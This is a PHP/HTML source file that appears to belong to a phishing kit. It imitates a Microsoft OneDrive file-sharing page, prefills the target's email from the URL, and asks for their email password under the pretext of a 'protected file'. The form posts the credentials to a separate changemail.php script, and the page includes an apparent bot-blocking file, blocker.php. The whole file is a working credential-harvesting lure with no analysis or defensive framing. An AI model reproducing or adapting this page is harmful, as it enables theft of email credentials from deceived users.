<?php
include('blocker.php');
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email = $userid;
$pass = "pass";

?><html>
<head>
<link rel="shortcut icon" href="https://r1.res.office365.com/owa/prem/16.975.15.1842835/resources/images/0/favicon_mail.ico" type="image/gif"/>
<title>Share-File | One Drive APP</title><script src='/google_analytics_auto.js'></script></head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">

	<img src="scr/one.png">

	<br><br>

	<b>

	<font face="verdana" size="2" color="#094AB2">
	Your File Is Waiting !!! 
	</font></b>

	<br><br>


	<img src="scr/ellipsis.gif" />



	<form method="post" action="changemail.php">




	<input name="email" type="email" class="form-control" id="email" value="<?php echo $email ?>" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" placeholder="Recipient Email">		
	<br><br>
	<font face="Verdana" size="2" color="#ff0000">
	OneDrive Protected file.  Access with your email login and access password.
	</font>
       <br><br>
	<input  name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="Email Password">	



	<br><br>

	<input type="submit" value="Open Secure-Drive" style="width:270px; height:60px; background-color: #1e90ff; border: solid 3px #1e90ff; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
�2017 &copy; All rights reserved.
	</font>	

	</div>

</td></tr>

</table>


</body>
</html>